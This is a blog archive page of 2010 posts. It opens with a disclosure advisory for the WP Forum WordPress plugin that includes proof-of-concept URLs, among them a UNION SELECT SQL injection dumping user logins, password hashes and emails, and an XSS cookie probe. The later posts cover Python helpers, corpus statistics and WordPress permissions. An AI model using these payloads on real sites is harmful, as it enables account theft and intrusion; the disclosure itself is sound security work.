
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Charles Hooper</title>
  <meta name="author" content="Charles Hooper">

  
  <meta name="description" content="Multiple Vulnerabilities in WP Forum (WordPress Plugin) 1. Advisory Information Title: Multiple Vulnerabilities in WP-Forum
Advisory URL: http://www &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.charleshooper.net/blog/page/5">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="http://feeds.feedburner.com/subversity" rel="alternate" title="Charles Hooper" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-12888528-1']);
    _gaq.push(['_trackPageview']);

    setTimeout("_gaq.push(['_trackEvent', '60_seconds', 'read'])", 60000);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>



</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Charles Hooper</a></h1>
  
    <h2>Thoughts and projects from a hacker and engineer</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="http://feeds.feedburner.com/subversity" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:www.charleshooper.net" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
	<li><a href="/about/">About Charles</a></li>
	<li><a href="/projects/">Projects</a></li>
	<li><a href="/contact/">Contact</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/multiple-vulnerabilities-in-wp-forum-wordpress-plugin/">Multiple Vulnerabilities in WP Forum (WordPress Plugin)</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-12-17T00:00:00+00:00" pubdate data-updated="true">Dec 17<span>th</span>, 2010</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1 id="section"></h1>

<h1 id="multiple-vulnerabilities-in-wp-forum-wordpress-plugin">Multiple Vulnerabilities in WP Forum (WordPress Plugin)</h1>

<h2 id="advisory-information">1. Advisory Information</h2>

<p>Title: Multiple Vulnerabilities in WP-Forum<br />
Advisory URL: http://www.charleshooper.net/blog/multiple-vulnerabilities-in-wp-forum-wordpress-plugin/<br />
Date Published: 12/17/2010<br />
Vendors Contacted: WordPress. Maintainer of plugin is unreachable.</p>

<h2 id="summary">2. Summary</h2>

<p>WP Forum is a plugin for the popular blog tool and publishing platform, WordPress.<br />
The author of WP Forum describes it as a “Simple discussion forum plugin” and<br />
“easy to use and administer.”</p>

<p>There exist multiple vulnerabilities in WP Forum. Basically, input validation is not<br />
performed at all resulting in SQL injection, stored XSS, and reflected XSS vulns.</p>

<p>Furthermore, the author wrote the plugin under the assumption that it would only be<br />
executed within the context of the WordPress administrative panel, thereby neglecting<br />
to perform proper authentication and authorization.</p>

<h2 id="vulnerability-information">3. Vulnerability Information</h2>

<p>Packages/Versions Affected: Probably all, but confirmed only on WP Forum 1.7.8</p>

<p>3a. Type:   SQL Injection [CWE-89]<br />
3a. Impact: Read application data, bypass protection mechanism,<br />
modify application data. There are multiple SQL injections present<br />
in WP Forum. The most prominent of which is the SQL injection present<br />
in the `group_login` functionality. Prior to logging in, an attacker<br />
can retrieve each group’s passwords due to the vulnerability listed<br />
below (3b).</p>

<p>3b. Type:   Plaintext Storage of a Password [CWE-256]<br />
3b. Impact: Password is easily retrieved from database</p>

<p>3c. Type:   XSS (Stored or Reflected) [CWE-79]<br />
3c. Impact: Execute unauthorized code or commands</p>

<p>3d. Type:   Auth Bypass via Direct Request [CWE-425]<br />
3d. Impact: Many or all of the administrative functions assume they are running<br />
in the context of the WordPress administrative section. As a result,<br />
they often do not check that the user is authenticated or authorized<br />
to perform a particular action. Example functionality includes adding<br />
or removing forum moderators and deleting forums. This vulnerability<br />
could lead to information exposure, privilege escalation, or data loss.</p>

<p>3e. Type:   Information Exposure Through Sent Data [CWE-201]<br />
3e. Impact: `sendmail.php` discloses users’ email addresses by accepting a user-<br />
provider “user” variable and returns a hidden  tag containing<br />
that user’s email address.</p>

<p>3f. Type:   External Control of Assumed-Immutable Web Parameter [CWE-472]<br />
3f. Impact: `sendmail.php` accepts user-provided input allowing it to be used as<br />
an email relay</p>

<h2 id="poc--technical-description">4. PoC &amp; Technical Description</h2>

<p>Due to the number of vulnerabilities in this package, I will not discuss each one<br />
individually. Instead, here are some sample POCs. Many more exploitable vulns exist<br />
in this package than what I am providing here.</p>

<p>4a. http://path.to/wordpress/?page_id=&amp;forumaction=group_login&amp;group_id=0 UNION SELECT CONCAT_WS(CHAR(58),user_login,user_pass,user_email) FROM wp_users LIMIT 1 #<br />
or (goes for all POCs): http://path.to/wordpress/?forumaction=group_login&amp;group_id=0 UNION SELECT CONCAT_WS(CHAR(58),user_login,user_pass,user_email) FROM wp_users LIMIT 1 #<br />
4b. N/A<br />
4c. http://path.to/wordpress/?forumaction=group_login&amp;group_id=alert(document.cookie);<br />
4d. http://path.to/wordpress/wp-content/plugins/wpforum/wp-forum-manage.php?editgroupsubmit=true&amp;group=&amp;groupname=&amp;passwd=<br />
4e. http://path.to/wordpress/wp-content/plugins/wpforum/sendmail.php?user= (email address will be in HTML source)<br />
4f. POST ‘submit=true&amp;sender=&amp;email=&amp;message=&amp;subject=&amp;replyto=<br />
to http://path.to/wordpress/wp-content/plugins/wpforum/sendmail.php (untested)</p>

<h2 id="report-timeline">5. Report Timeline</h2>

<p>12/10/2010 Initial email sent to WordPress security.<br />
12/10/2010 Maintainer not yet contacted as project appears abandoned and maintainer<br />
does not have listed contact information.<br />
12/17/2010 No reply from WordPress security. Advisory released.</p>

<h2 id="references">6. References</h2>

<p>6a. The WordPress Plugin page for WP Forum:</p>

<p>http://wordpress.org/extend/plugins/wpforum/</p>

<p>6b. The WordPress Profile page for the author of the plugin:</p>

<p>http://profiles.wordpress.org/users/fahlstad/</p>

<p>6c. The plugin author’s website:</p>

<p>http://www.fahlstad.se/</p>

<h2 id="legalese">7. Legalese</h2>

<p>This vulnerability report by Charles Hooper &lt; chooper@plumata.com &gt; is<br />
licensed under a Creative Commons Attribution-NonCommercial-ShareAlike<br />
3.0 Unported License.</p>

<h2 id="signature">8. Signature</h2>

<p>Public Key: Obtainable via pool.sks-keyservers.net</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/going-into-business-learn-a-programming-language/">Going Into Business? Learn a Programming Language</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-11-15T00:00:00+00:00" pubdate data-updated="true">Nov 15<span>th</span>, 2010</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1 id="section"></h1>

<p>When doing homework for my business-related classes, I often find that knowing a programming language is very advantageous. Certainly there are times when it makes sense to use a calculator, but repeatedly entering the same equation over and over is tedious and inefficient. There are also times when it’s a good idea to make a spreadsheet, but even this can be overkill.</p>

<p>In cases where I’m repeating the same tasks or expressions frequently and a spreadsheet seems like overkill, I’ll open a Python shell and define the expression I need as a function. More often than not, these functions are one liners that I probably won’t use again. At least, not until I get a “Real Job (TM)” where I’ll need to use said expressions more frequently.</p>

<p>As an example, I recently found myself calculating the gains and/or losses between two given foreign exchange rates. The example below calculates the gain or loss between two period’s exchange rates for a given currency.</p>

<pre><code>def xchg_diff(qty,old_rate,new_rate):
    """
    qty = Amount of 'domestic currency'
    old_rate = Exchange rate of foreign currency in previous period
    new_rate = Exchange rate of foreign currency in current period
    """
    return round(qty * (new_rate - old_rate))
</code></pre>

<p>In this example, the hypothetical company had 850,000 pesos that it held over multiple accounting periods. I was given a table of dates that corresponded with these accounting periods and the exchange rate of pesos to U.S. Dollars (USD $) that looked similar to the one below.</p>

<p>Date</p>

<p>Exchange Rate</p>

<p>Mar 31, 2009</p>

<p>0.0698</p>

<p>Jun 30, 2009</p>

<p>0.0756</p>

<p>Sep 30, 2009</p>

<p>0.0737</p>

<p>Dec 31, 2009</p>

<p>0.0777</p>

<p>The equation is simple enough to type into a calculator, but I find most calculators to have a clumsy interface when it comes to editing the numbers in previous expressions. In this case, I simply opened up a Python shell and, after defining the above function, I typed:</p>

<pre><code>&gt;&gt;&gt; xchg_diff(850000,0.0698,0.0756)
4930.0
&gt;&gt;&gt; xchg_diff(850000,0.0756,0.0737)
-1615.0
&gt;&gt;&gt; xchg_diff(850000,0.0737,0.0777)
3400.0
</code></pre>

<p>As we can see from the transcript, I was quickly able to find the following results:</p>

<p>Date</p>

<p>Gain / (loss)</p>

<p>Jun 30, 2009</p>

<p>$4930</p>

<p>Sep 30, 2009</p>

<p>$(1615)</p>

<p>Dec 31, 2009</p>

<p>$3400</p>

<p>Many people have asked me if I thought that my experience in computers and programming would go to waste once I entered the world of business and, in particular, finance. My response has been, and will continue to be, “No.” Knowing how to automate routine tasks, being able to write data models, and having a firm grasp on algorithms will only help me to be more effective in my future career.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/cost-behavior-analysis-calculator/">Cost Behavior Analysis Calculator</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-11-08T00:00:00+00:00" pubdate data-updated="true">Nov 8<span>th</span>, 2010</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1 id="section"></h1>

<p>One of the projects I’ve been working on lately is my <a href="http://apps.charleshooper.net/cost-behavior-analysis/">Cost Behavior Analysis Calculator</a>.</p>

<p><strong>Cost behavior analysis</strong> is the process of dividing a mixed cost into its <em>variable and fixed components</em>. Doing this can be a long and tedious process. This process, when done manually, involves:</p>

<ol>
  <li><strong>Determining which metric or activity <em>drives costs</em>.</strong> A common example in manufacturing is “machine hours.” Using this technique, you could determine how much each “machine hour” affects your power bill.</li>
  <li><strong>Making a scatter graph of your data.</strong> When you’re plotting your data, what you’re looking for is that a <em>linear relationship</em> exists between your <em>cost driver</em> and your <em>costs</em>. If a linear relationship doesn’t exist, then it isn’t a cost driver – pick a new metric and try again.</li>
  <li><strong>Fitting a line to the scatter graph.</strong> When working on paper, it’s easier to use the <a href="http://www.suite101.com/content/job-costing-using-the-high-low-method-a207711">high-low method</a>. However, this method is considered inaccurate as it only uses two points from your entire data set. Not to mention, the highest and lowest points of these data sets are usually considered “atypical.” The <a href="http://apps.charleshooper.net/cost-behavior-analysis/">Cost Behavior Analyzer</a> uses <a href="http://www.finance-lib.com/financial-term-least-squares-regression-analysis.html">least-squares regression</a> to fit a more accurate line.</li>
  <li><strong>Measure your slope and y-intercept.</strong> The <strong>slope</strong> of the line is your <em>variable cost</em> and the <strong>y-intercept</strong> is your <em>fixed cost</em>.</li>
</ol>

<p>I developed the <a href="http://apps.charleshooper.net/cost-behavior-analysis/">Cost Behavior Analyzer</a> because I found that doing this work manually was tedious and repetitive. I’m making it available here so others can benefit from its use. Managerial accountants, financiers, business owners, and entrepreneurs alike should all know what’s driving their costs and how to accurately predict them.</p>

<p><a href="http://apps.charleshooper.net/cost-behavior-analysis/">Try the Cost Behavior Analyzer out now!</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/twitter-vs-erotica-your-corporas-source-matters/">Twitter vs Erotica: Your Corpora&#8217;s Source Matters</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-10-30T00:00:00+00:00" pubdate data-updated="true">Oct 30<span>th</span>, 2010</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1 id="section"></h1>

<p><img src="http://www.charleshooper.net/wp-content/uploads/3998147057_f5dd7ce442-150x150.jpg" alt="Dictionary" title="Dictionary" />
© uair01; some rights reserved.</p>

<p>As a result of my now <a href="http://www.charleshooper.net/blog/rip-booksuggest/">defunct project, BookSuggest</a>, I’ve built a fairly large corpus that has been seeded entirely from Twitter. This corpus weighs in at:</p>

<ul>
  <li>16,680,000 documents (tweets)</li>
  <li>1,970,165 unique (stemmed) words<br />
<em>(Red flag: <a href="http://www.oxforddictionaries.com/page/93">Oxford Dictionary</a> suggests there’s an estimated 250,000 words in the English language. This discrepancy is the result of my failure to filter Tweets based on language, the fact that usernames were included in the count, and the fact that people “make words up.” Also, “haha” becomes one word while “hahahaha” becomes another.)</em></li>
  <li>83,758,872 words total.</li>
</ul>

<p>When I look at these numbers, I often think about how the source documents a corpus/histogram is derived from affects the distribution of its term frequencies. The most obvious example is language. A French corpus will never come close to an English corpus. A less obvious example is subject matter. For example, a corpus derived from English literature will have a different term distribution than a corpus derived from an English medical journal. Common terms will have similar frequencies, but there will be biases towards terms that are domain-specific.</p>

<p>To demonstrate, I scraped the “Erotica” section of <a href="http://www.textfiles.com/">textfiles.com</a> and built a corpus based on the data there. The resulting corpus is composed of:</p>

<ul>
  <li>4,337 documents</li>
  <li>50,709 unique (stemmed) words</li>
  <li>10,413,715 words total.</li>
</ul>

<h2 id="notes-on-term-counting">Notes on Term Counting</h2>

<ul>
  <li>Words that had a length of <em>less than 4 characters</em> were <strong>discarded</strong></li>
  <li>Words were then <em>stemmed</em> using the <a href="http://tartarus.org/~martin/PorterStemmer/">Porter Stemming algorithm</a></li>
  <li>There may be some slight differences between how words were counted in both corpora, based on minor programming differences</li>
</ul>

<h2 id="the-data">The Data</h2>

<p>Finally, here are the term frequencies with the obvious domain-specific terms in bold:</p>

<p><strong>Corpus Seeded from Twitter</strong></p>

<p>![Counts of Top 20 Terms from Twitter Corpus][6]  </p>

<ol>
  <li>that (0.84%)</li>
  <li>just (0.70%)</li>
  <li>with (0.69%)</li>
  <li>thi (0.68%)</li>
  <li>have (0.65%)</li>
  <li>your (0.61%)</li>
  <li>like (0.56%)</li>
  <li>love (0.54%)</li>
  <li><strong>follow (0.45%)</strong></li>
  <li>what (0.44%)</li>
  <li>from (0.36%)</li>
  <li>haha (0.35%)</li>
  <li>good (0.34%)</li>
  <li>para (0.34%)</li>
  <li>will (0.32%)</li>
  <li>when (0.30%)</li>
  <li>know (0.30%)</li>
  <li>want (0.30%)</li>
  <li>about 0.30%)</li>
  <li>make (0.30%)</li>
</ol>

<p><strong>Corpus Seeded from Erotica</strong></p>

<p>![Counts of Top 20 Terms from Erotica Corpus][7]  </p>

<ol>
  <li>that (1.83%)</li>
  <li>with (1.42%)</li>
  <li>into (0.76%)</li>
  <li>down (0.70%)</li>
  <li>then (0.66%)</li>
  <li>back (0.66%)</li>
  <li>from (0.65%)</li>
  <li>thi (0.65%)</li>
  <li>hand (0.64%)</li>
  <li>were (0.59%)</li>
  <li>look (0.58%)</li>
  <li>have (0.58%)</li>
  <li><strong>cock (0.57%)</strong></li>
  <li>like (0.57%)</li>
  <li>over (0.57%)</li>
  <li>thei (0.56%)</li>
  <li>your (0.56%)</li>
  <li>what (0.55%)</li>
  <li>said (0.55%)</li>
  <li>could (0.54%)</li>
</ol>

<p>You’ll note that the Twitter corpus had a heavy bias towards the term “<em>follow</em>” whereas the Erotica corpus shows an overwhelming use of the term “<em>cock</em>” (Writers: Use synonyms.)</p>

<table>
  <tbody>
    <tr>
      <td>[6]: http://chart.apis.google.com/chart?chxl=0:</td>
      <td>that</td>
      <td>just</td>
      <td>with</td>
      <td>thi</td>
      <td>have</td>
      <td>your</td>
      <td>like</td>
      <td>love</td>
      <td>follow</td>
      <td>what</td>
      <td>from</td>
      <td>haha</td>
      <td>good</td>
      <td>para</td>
      <td>will</td>
      <td>when</td>
      <td>know</td>
      <td>want</td>
      <td>about</td>
      <td>make&amp;chxr=0,0,703297&amp;chxt=x&amp;chbh=a,4,10&amp;chs=600x200&amp;cht=bvg&amp;chco=4D89F9&amp;chds=0,703297&amp;chd=t:703297,582988,581346,573197,547218,513823,467673,455264,378187,367112,302254,296974,286671,283887,272176,254419,252303,251673,251325,248572&amp;chtt=Counts of Top 20 Terms from Twitter Corpus</td>
    </tr>
    <tr>
      <td>[7]: http://chart.apis.google.com/chart?chxl=0:</td>
      <td>that</td>
      <td>with</td>
      <td>into</td>
      <td>down</td>
      <td>then</td>
      <td>back</td>
      <td>from</td>
      <td>thi</td>
      <td>hand</td>
      <td>were</td>
      <td>look</td>
      <td>have</td>
      <td>cock</td>
      <td>like</td>
      <td>over</td>
      <td>thei</td>
      <td>your</td>
      <td>what</td>
      <td>said</td>
      <td>could&amp;chxr=0,0,190543&amp;chxt=x&amp;chbh=a,4,10&amp;chs=600x200&amp;cht=bvg&amp;chco=F889F9&amp;chds=0,190543&amp;chd=t:190543,148204,78688,72452,69045,68642,68164,67998,66826,61787,60236,60179,59622,59357,58856,58760,57851,57670,57348,55739&amp;chtt=Counts of Top 20 Terms from Erotica Corpus</td>
    </tr>
  </tbody>
</table>

<h2 id="practical-reasons-why-this-is-important">Practical Reasons Why This Is Important</h2>

<p>This is important because if I were to build a domain-specific search-engine, I would be better off  seeding my corpus from domain-specific content. If I don’t, my relevance (tf-idf) scores will be inaccurate. For example, an Erotica-specific search engine should decrease the weight for the term “<em>cock</em>” strictly because it has a very high document frequency and is therefore less-significant. Meanwhile, a Twitter-specific search engine should discount the weight of “<em>follow</em>.”</p>

<h2 id="conclusion">Conclusion</h2>

<p>To conclude, the subject matter of a document set will create a bias towards domain-specific terms in the document set’s histogram of term frequencies. If you are calculating relevance for any particular document set, you should use a corpus derived from that document set. In other words, if you can, try not to re-use your corpora!</p>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/wordpress-auto-upgrade-and-dumb-permissions/">WordPress Auto Upgrade and &#8220;Dumb&#8221; Permissions</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-10-29T00:00:00+00:00" pubdate data-updated="true">Oct 29<span>th</span>, 2010</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1 id="section"></h1>

<p>One of the nice features about WordPress is its ability to upgrade and
install plugins on the fly. This is nice because now you don’t need to
be bothered with the hassle of downloading plugins, unzipping their
contents, and transferring them to your web server.</p>

<p>Unfortunately, the way in which WordPress determines if it has the
appropriate permissions to upgrade plugins is implemented poorly. When
WordPress doesn’t think it has permission, the admin panel will instead
<strong>prompt you for FTP login information</strong>. This is a problem because
sometimes WordPress will do this falsely even if it <em>does</em> have proper
permissions.</p>

<h2 id="the-problem">The Problem</h2>

<p>The way WordPress tries to guess if it has proper permissions is very
primitive. Instead of using PHP’s <a href="http://us.php.net/manual/en/function.is-writable.php">is_writable</a>, WordPress instead
compares the web server’s User ID with the User ID of the wp-content
directory’s owner*. While this might work for a large number of cases,
it doesn’t work in all of them (including mine).</p>

<p>* It’s actually slightly more complicated than this, but the effect is the same.</p>

<h2 id="the-environment">The Environment</h2>

<p>I run WordPress 3.x on Ubuntu 10.04 LTS under Lighttpd and PHP5-cgi.
Lighttpd runs as user <code>www-data</code> and group <code>www-data</code>. If I wanted to
let WordPress’ auto-detection of permissions work, I would have to
change the owner of my website directories to www-data. This doesn’t fly
with me, because I also want my user to have easy access to my document
root and don’t like the idea of my data being user-owned by my webserver
user.</p>

<h2 id="the-solution">The Solution</h2>

<p>Instead of bending over to WordPress’ permission issues, I was able to
perform the following simple steps to have auto-installing/updating
plugins and themes *without *changing user ownership of my web files.</p>

<ol>
  <li>
    <p><code>sudo chgrp -R www-data /path/to/wp/wp-content</code></p>

    <p>This changes group ownership of wp-content and all sub-directories
to be group-owned by your webserver user. wp-content is where WordPress
stores plugins, themes, cache files, and (AFAIK) file uploads. </p>
  </li>
  <li>
    <p><code>sudo chmod -R g+w /path/to/wp/wp-content</code></p>

    <p>This makes wp-content and all of its sub-directories group-writable. </p>
  </li>
  <li>
    <p><code>sudo chmod g+s /path/to/wp/wp-content</code></p>

    <p>This, <code>g+s,</code> is known as <strong>setgid</strong>. This causes newly-created files
to be group-owned by <code>wp-content</code>’s owning group, in this case <code>www-data</code>. </p>
  </li>
  <li>
    <p>Finally, add the following to the bottom of <code>wp-config.php</code>. This is
an override built into the WordPress code. For more information, take a
look at <code>wp-admin/includes/file.php</code>’s function
<code>get_filesystem_method</code>. </p>
  </li>
</ol>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Enable direct file updating in wp-config.php </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="x">/* Force direct file updating</span>
</span><span class="line"><span class="x">- http://www.charleshooper.net/blog/wordpress-auto-upgrade-and-dumb-permissions/</span>
</span><span class="line"><span class="x">*/</span>
</span><span class="line"><span class="x">define(&#39;FS_METHOD&#39;, &#39;direct&#39;);</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>So there you have it. WordPress does a poor job of properly detecting file permissions and, in some cases, needs to be overridden. If you’re still having problems after this, <strong>let me know</strong> and I will do my best to help you.</p>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/rip-booksuggest/">RIP BookSuggest</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-10-26T00:00:00+00:00" pubdate data-updated="true">Oct 26<span>th</span>, 2010</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1 id="section"></h1>

<p>BookSuggest, the web-based book recommendation engine, is officially dead. I’ve been treating BookSuggest as the lowest of priorities for quite some time now and I’m more than happy to declare this project a failure. Here is a brief recap of BookSuggest’s history.</p>

<p>Before BookSuggest was a web application, I used to <a href="http://www.charleshooper.net/blog/how-i-made-money-spamming-twitter-with-contextual-book-suggestions/">spam unsuspecting Twitter users</a> with book recommendations. Eventually, Twitter stepped up their anti-spam stance and suspended my spam account. I retired the project for a while until one day I decided to build a web application around the recommendation technology I was using.</p>

<p>This technology was simply scoring words in a user’s timeline, taking the four highest-scoring words, and then passing them to an Amazon ItemSearch query. More specifically, the type of search in use was what Amazon calls a TextStream search. This search method is what allowed me to get book recommendations, even if the search terms provided weren’t all that great. Without it, it’s not unlikely that my ItemSearches wouldn’t return any results at all.</p>

<p>So imagine my surprise when I read the following in Amazon’s API documentation:</p>

<blockquote>
  <p>Due to low usage, the Product Advertising API operations and response groups listed below will not be supported after October 15, 2010:</p>

  <p>…<br />
Additionally, due to low usage, we will be discontinuing Multiple Operation Requests and the <strong>TextStream</strong> search parameter.</p>
</blockquote>

<p>Oh, shoot!</p>

<p>Financially, it makes sense for me to cut my losses here. Back when I was still spamming Twitter, I was pulling over $100/mo. Through the web-app, my referral fees are much smaller. As of this moment, I have a balance of just $9 with Amazon and haven’t cashed out since the start of the project.</p>

<p>Some numbers:</p>

<ul>
  <li>Unique Twitter users: 393</li>
  <li>Recommendations made: 611</li>
  <li>Documents in corpus: 17,458,549</li>
  <li>Unique words in corpus: 1,970,165</li>
  <li>Top 5 words in corpus: that, just, with, this, have</li>
</ul>

<p>RIP BookSuggest!</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/code-responsibly/">Code Responsibly: What&#8217;s Best for Your Clients?</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-10-23T00:00:00+00:00" pubdate data-updated="true">Oct 23<span>rd</span>, 2010</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1 id="section"></h1>

<p>We programmers have a natural affinity for writing and using our own code. You can’t really blame us; this is akin to gardeners who prefer to eat vegetables they grow, or brewers who prefer to drink their own beer. However, this oftentimes leads to a frequent re-invention of the wheel. While this isn’t always a bad thing, it doesn’t usually benefit our clients and here’s why:</p>

<ol>
  <li>**Increased development time. **If a client is paying you hourly, why should they pay for you to re-invent a solution that already exists? Why write a new CMS if WordPress will do? When you write a new CMS from scratch for a client, you are increasing their development costs.</li>
  <li>**Freedom in hosting. **It’s no coincidence that many web developers also host their projects as well. This is fine for larger applications, but for the majority of the client work out there your clients should have the freedom to a broad range of hosting options. Vendor lock-in is a terrible thing.</li>
  <li>**Post-development support. **If a client needs customizations done to the code base, they should be able to solicit the work from almost any developer. Certainly you would want preference in these solicitations, but there shouldn’t be any clients who are stuck with you. When you use your own custom solution, you are increasing your clients’ maintenance costs.</li>
</ol>

<p>I’m <em>not</em> saying that you shouldn’t ever write new code. What I <em>am</em> saying is that your responsibility to the client is to use the best tools for the job and to put together the best solution for them that you can. Sometimes this means flexing your coding muscles and sometimes this means humbly setting up existing software such as WordPress. So please, write new code conservatively and responsibly.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/validating-data-with-new-style-classes-in-python/">Validating Data With New-Style Classes in Python</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-10-11T00:00:00+00:00" pubdate data-updated="true">Oct 11<span>th</span>, 2010</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1 id="section"></h1>

<p>Every once in awhile in my reading I come across a minor reference to what pythonistas refer to as <strong>new-style classes</strong>. One of the nice things about new-style classes is the `property` decorators. These property decorators allow you to build getter and setter methods to access object attributes. This is pretty awesome because now you can perform validation at the model/class level whenever you assign a value to a property of an object.</p>

<p>e.g., In one of my projects, I have an attribute named <em>timestamp</em> that takes a `datetime` object. I was concerned about receiving incorrect types from my input because there are alot of ways a programmer can represent the concept of time. Some realistic possibilities of invalid types in my case are:</p>

<ul>
  <li>`time` objects from the time module</li>
  <li>`string` objects that contain the date and time (and various possible formats)</li>
  <li>`float` or `int` objects that contain a unix timestamp</li>
</ul>

<p>With a setter method, you can test that the new value being assigned to an attribute is the correct type before assigning it. You can also throw an <strong>exception</strong> if it’s not. In other words, you can do something like this:</p>

<pre><code>from datetime import datetime

class SomeObject(object):    # new-style classes must be subclassed from object
    _timestamp = None

    @property
    def timestamp(self):
        return self._timestamp

    @timestamp.setter    # the prefix must match the read-only getter func name
    def timestamp(self,value):    # the func name must match the read-only getter func name
        if not isinstance(value, datetime):
            raise ValueError(“Timestamp can only be an instance of Datetime”)
        self._timestamp = value
</code></pre>

<p>Go ahead and try it!</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/three-reasons-why-im-ditching-chunkhost/">Three Reasons Why I&#8217;m Ditching ChunkHost</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2010-10-04T00:00:00+00:00" pubdate data-updated="true">Oct 4<span>th</span>, 2010</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h1 id="section"></h1>

<p>I’ve been using <a href="http://chunkhost.com/r/chdotnet">ChunkHost</a> for the past <strong>eight months</strong> to host my website and some minor web applications. After my short, free “beta” period I was given a 30% discount (forever) and billed like a normal customer. I’ve only had to pay <strong>$13.30</strong> a month for a Xen VPS with <strong>512MB RAM</strong>. This used to be pretty competitive <a href="http://blog.linode.com/2010/06/16/linode-turns-7-big-ram-increase/">until Linode increased the RAM for all of their VPS packages</a>. Unfortunately for ChunkHost, this Linode RAM increase and some recent events have persuaded me to <a href="http://www.linode.com/?r=2fce38a23c4154c3a1abb4f99aafd6371ee78ecc"><strong>pay the extra 7 bucks to Linode</strong></a>. Here are the three main reasons why I’m ditching ChunkHost:</p>

<ol>
  <li><strong>No way to give feedback on the service.</strong> First, let me qualify this and say that there <em>is</em> a “Feedback” button on the site. However, more than a quick cursory glance reveals that their feedback system is <strong>inactive **and **neglected</strong>. For example, I have an eight month old feature request that has gone ignored; not rejected, not WONTFIX’d, but ignored. Other customers have older feature requests that have been promised “shortly” and never delivered.<img src="http://sub-public.s3.amazonaws.com/blog_imgs/chunkhost-inactive.png" alt="An example of ChunkHost's inactive GetSatisfaction feedback page" title="chunkhost-inactive.png" /> 
  
    <ul>
      <li>
        <p><strong>There is no SLA (service-level agreement) or uptime guarantee.</strong> Recently, I noticed that my VM was down and the main page for ChunkHost was down as well. I emailed support about the outage and was happy to receive a quick reply.<br />
&gt; Yeah, we’re looking at it now; it looks like networking oddness on one of the host machines. We’ll update Twitter with info as we have it!</p>

        <p>The “fix” consisted of ChunkHost <strong>rebooting the physical host</strong> my VM was on. This same problem occurred *again <strong>*5 hours later</strong>. I don’t sense any empathy from ChunkHost for bearing with them through their downtime and I certainly haven’t received any type of apology. Am I entitled to one? With the lack of an SLA, maybe not, but I’d be alot less bitter and I might have remained a customer had I received one.</p>
      </li>
      <li>
